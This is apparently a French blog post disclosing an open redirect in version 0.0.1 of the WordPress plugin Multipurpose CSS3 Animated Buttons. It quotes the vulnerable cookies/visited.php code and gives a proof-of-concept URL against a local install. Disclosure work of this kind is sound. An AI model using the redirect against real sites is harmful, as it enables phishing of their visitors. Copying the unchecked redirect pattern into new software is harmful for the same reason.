---
title: "Open Redirect dans le plugin Wordpress Multipurpose CSS3 Animated Buttons"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [Multipurpose CSS3 Animated Buttons](https://wordpress.org/plugins/multipurpose-css3-animated-buttons/) se présente de cette façon :

> Multipurpose CSS3 Animated Buttons allow you to select between social media buttons or your own links.
> Fully customizable social buttons with like, tweet, google+1, pin-it and feedburner counts.
> Fully customizable links and titles for your buttons.
> Uses CSS3 Animations.
> Uses cookies to style visited buttons.
> Basic settings which covers vital customizations and easy as pie.
> Advanced settings to enter your custom css and more.

Ce plugin a été testé en version 0.0.1. Il date d'il y a 11 ans.

## La vulnérabilité

La vulnérabilité est tout bête : le script `cookies/visited.php` récupère une URL via le paramètre `targetURL`, puis effectue une redirection vers l'URL sans avertir l'utilisateur, à condition qu'un autre paramètre soit bien présent :

```php
<?php                                                                                                                  
    $button3d1 = $_GET[ '3d-1' ];                                                                                      
    $button3d2 = $_GET[ '3d-2' ];                                                                                      
    $button3d3 = $_GET[ '3d-3' ];                                                                                      
    $button3d4 = $_GET[ '3d-4' ];                                                                                      
    $button3d5 = $_GET[ '3d-5' ];                                                                                      
    $button3d6 = $_GET[ '3d-6' ];                                                                                      
    $button3d7 = $_GET[ '3d-7' ];                                                                                      
    $button3d8 = $_GET[ '3d-8' ];                                                                                      
    $button3d9 = $_GET[ '3d-9' ];                                                                                      
    $button3d0 = $_GET[ '3d-0' ];                                                                                      
    $targetURL = $_GET['targetURL'];                                                                                   
    $expiry = time()+60*60*24*365;                                                                                     
      if ( $button3d1 == true ) {                                                                                      
        setcookie ( "button-1-visited", $button3d1, $expiry, "/" ) ;                                                   
        header ( 'Location: '.$targetURL ) ;                                                                           
      } else if ( $button3d2 == true ) {                                                                               
        setcookie ( "button-2-visited", $button3d2, $expiry, "/" ) ;                                                   
        header ( 'Location: '.$targetURL ) ;                                                                           
      } else if ( $button3d3 == true ) {                                                                               
        setcookie ( "button-3-visited", $button3d3, $expiry, "/" ) ;                                                   
        header ( 'Location: '.$targetURL ) ;                                                                           
      } else if ( $button3d4 == true ) {                                                                               
        setcookie ( "button-4-visited", $button3d4, $expiry, "/" ) ;                                                   
        header ( 'Location: '.$targetURL ) ;                                                                           
      } else if ( $button3d5 == true ) {                                                                               
        setcookie ( "button-5-visited", $button3d5, $expiry, "/" ) ;                                                   
        header ( 'Location: '.$targetURL ) ;                                                                           
      } else if ( $button3d6 == true ) {                                                                               
        setcookie ( "button-6-visited", $button3d6, $expiry, "/" ) ;                                                   
        header ( 'Location: '.$targetURL ) ;                                                                           
      } else if ( $button3d7 == true ) {                                                                               
        setcookie ( "button-7-visited", $button3d7, $expiry, "/" ) ;                                                   
        header ( 'Location: '.$targetURL ) ;                                                                           
      } else if ( $button3d8 == true ) {                                                                               
        setcookie ( "button-8-visited", $button3d8, $expiry, "/" ) ;                                                   
        header ( 'Location: '.$targetURL ) ;                                                                           
      } else if ( $button3d9 == true ) {                                                                               
        setcookie ( "button-9-visited", $button3d9, $expiry, "/" ) ;                                                   
        header ( 'Location: '.$targetURL ) ;                                                                           
      } else if ( $button3d0 == true ) {                                                                               
        setcookie ( "button-0-visited", $button3d0, $expiry, "/" );                                                    
        header ( 'Location: '.$targetURL);                                                                             
       }                                                                                                               
?>
```

PoC :

```
http://localhost:8000/wp-content/plugins/multipurpose-css3-animated-buttons/cookies/visited.php?3d-3=true&targetURL=https%3A%2F%2Fopenbugbounty.org%2F&submit=submit
```
